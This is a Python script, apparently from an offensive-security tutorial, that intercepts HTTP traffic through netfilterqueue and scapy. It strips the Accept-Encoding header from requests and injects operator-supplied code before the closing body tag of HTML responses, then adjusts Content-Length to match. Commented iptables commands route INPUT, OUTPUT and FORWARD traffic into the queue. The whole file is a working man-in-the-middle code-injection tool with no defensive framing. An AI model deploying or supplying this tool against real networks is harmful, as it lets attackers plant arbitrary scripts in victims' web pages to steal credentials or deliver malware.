#!usr/bin/env python
import netfilterqueue
import scapy.all as scapy
import os
import re
from colorama import Fore
import subprocess
subprocess.call("clear")
logo = """

   ______                __         _____               _                _                   
 .' ___  |              |  ]       |_   _|             (_)              / |_                 
/ .'   \_|  .--.    .--.| | .---.    | |   _ .--.      __  .---.  .---.`| |-' .--.   _ .--.  
| |       / .'`\ \/ /'`\' |/ /__\\   | |  [ `.-. |    [  |/ /__\\/ /'`\]| | / .'`\ \[ `/'`\] 
\ `.___.'\| \__. || \__/  || \__.,  _| |_  | | | |  _  | || \__.,| \__. | |,| \__. | | |     
 `.____ .' '.__.'  '.__.;__]'.__.' |_____|[___||__][ \_| | '.__.''.___.'\__/ '.__.' [___]    
                                                    \____/                                   

"""

print(f"{Fore.LIGHTGREEN_EX}{logo}\n")
print(f"{Fore.LIGHTGREEN_EX}[+]-[+]-[+]-[+]-[+]-[+]-[+]-[+]-[+]-[+]-[+]-[+]-[+]-[+]-[+]-[+]-[+]-[+]-[+]-[+] *** Created by: {Fore.LIGHTRED_EX}Totenkopf\n")
print(f"{Fore.LIGHTWHITE_EX}[-] Please wait ... \n")
injection_code = input("Insert the injection code: \n")

def set_load(packet, load):
    packet[scapy.Raw].load = load
    del packet[scapy.IP].len
    del packet[scapy.IP].chksum
    del packet[scapy.TCP].chksum
    return packet

def process_packet(packet):
    scapy_packet = scapy.IP(packet.get_payload())
    if scapy_packet.haslayer(scapy.Raw):
        try:
            load = scapy_packet[scapy.Raw].load.decode()
            if scapy_packet[scapy.TCP].dport == 80:
                # print("HTTP Request")
                load = re.sub("Accept-Encoding:.*?\\r\\n", "", load)
                # print(scapy_packet.show())

            elif scapy_packet[scapy.TCP].sport == 80:
                # print("HTTP Response")


                load = load.replace("</body>",  injection_code + "</body>")
                content_length_search = re.search("(?:Content-Length:\s)(\d*)", load)
                if content_length_search and "text/html" in load:
                    content_length = content_length_search.group(1)
                    new_content_length = int(content_length) + len(injection_code)
                    load = load.replace(content_length , str(new_content_length))
                print("[+] Injecting code ... ")

            if load != scapy_packet[scapy.Raw].load:
                new_packet = set_load(scapy_packet, load)
                packet.set_payload(bytes(new_packet))


        except UnicodeDecodeError:
            pass


    packet.accept()

    # os.system("iptables --flush")
    # os.system("iptables -I INPUT -j NFQUEUE --queue-num 0")
    # os.system("iptables -I OUTPUT -j NFQUEUE --queue-num 0")
    # os.system("iptables --flush")
    # os.system("iptables -I FORWARD -j NFQUEUE --queue-num 0")

try:
    queue = netfilterqueue.NetfilterQueue()
    queue.bind(0, process_packet)
    queue.run()
except (KeyboardInterrupt):
    os.system("iptables --flush")
    print("\nIPs flushed, quitting ... \n")